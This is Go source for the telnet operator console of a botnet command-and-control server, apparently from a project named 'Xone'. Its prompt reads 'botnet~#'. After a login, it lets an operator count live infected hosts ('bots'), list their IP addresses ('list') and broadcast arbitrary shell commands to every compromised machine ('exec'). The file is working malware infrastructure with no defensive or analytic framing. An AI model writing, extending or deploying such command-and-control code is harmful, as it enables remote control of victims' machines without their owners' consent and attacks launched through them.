package cnc

import (
	"Xone/utils"
	"bufio"
	"fmt"
	"io"
	"net"
	"strings"
)

func NewTelnetServer(server *CNC) *TelnetServer {
	t := &TelnetServer{
		UserName:         utils.GlobalObject.TelnetName,
		PassWord:         utils.GlobalObject.TelnetPassWord,
		TelnetListenAddr: utils.GlobalObject.TelnetAddr,
		TelnetListenPort: utils.GlobalObject.TelnetPort,
		server:           server,
	}
	return t
}

func (t *TelnetServer) TelnetListen() {
	listen, err := net.Listen("tcp", fmt.Sprintf(t.TelnetListenAddr+":"+t.TelnetListenPort))
	if err != nil {
		fmt.Println("[!]Telnet控制端监听失败 -->", err)
		return
	}
	defer listen.Close()
	fmt.Println("[*]Telnet控制端启用成功 -->", fmt.Sprintf(t.TelnetListenAddr+":"+t.TelnetListenPort))
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("[-]接受Telnet连接错误 -->", err)
			continue
		}
		go t.TelnetConnection(conn)
	}
}

func (t *TelnetServer) TelnetConnection(conn net.Conn) {

	authenticated := false

	fmt.Fprint(conn, "Username: ")
	username, _ := bufio.NewReader(conn).ReadString('\n')
	username = strings.TrimSpace(username)
	fmt.Fprint(conn, username+"Password for: ")
	password, _ := bufio.NewReader(conn).ReadString('\n')
	password = strings.TrimSpace(password)
	if t.authenticateUser(username, password) {
		authenticated = true
		fmt.Fprintln(conn, Green, "Authentication successful!\r", Reset)
	} else {
		fmt.Fprintln(conn, Red, "Authentication failed.\r", Reset)
		conn.Close()
		return
	}
	for {
		if !authenticated {
			break
		}
		fmt.Fprint(conn, Yellow, "Xone", Reset, "@", Red, "botnet~#", Reset)
		data, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil && err != io.EOF {
			fmt.Println("[-]读取控制端命令错误", err)
			authenticated = false
		} else if err == io.EOF {
			authenticated = false
		}
		temp := strings.Split(data, " ")[0]
		switch true {
		case "exit" == strings.TrimSpace(temp):
			fmt.Fprintln(conn, "bye!")
			authenticated = false
		case "bots" == strings.TrimSpace(temp):
			fmt.Fprintln(conn, "Survival:", len(t.server.OnlineMap), "\r")
		case "list" == strings.TrimSpace(temp):
			if len(t.server.OnlineMap) != 0 {
				for id, _ := range t.server.OnlineMap {
					fmt.Fprint(conn, "[IP:", Cyan, id, Reset, "]\r\n")
				}
				continue
			}
			fmt.Fprintln(conn, "No Online hosts", "\r")
		case "exec" == strings.TrimSpace(temp):
			x1 := strings.Split(data, " ")[1:]
			x2 := strings.Join(x1, " ")
			x3 := strings.TrimSpace(x2)
			t.server.exec <- x3
		case "help" == strings.TrimSpace(temp):
			fmt.Fprintln(conn, "Available commands:\r")
			fmt.Fprintln(conn, Blue, "-", Reset, "help check help info\r")
			fmt.Fprintln(conn, Blue, "-", Reset, "list  range map\r")
			fmt.Fprintln(conn, Blue, "-", Reset, "bots check bots count\r")
			fmt.Fprintln(conn, Blue, "-", Reset, "help exec cmd\r")
			continue
		case len(strings.TrimSpace(temp)) == 0:
			continue
		default:
			fmt.Fprintln(conn, "Invalid command\r")
		}
	}
	conn.Close()
}

func (t *TelnetServer) authenticateUser(UsrName string, PassWord string) bool {
	if UsrName == t.UserName && PassWord == t.PassWord {
		return true
	}
	return false
}
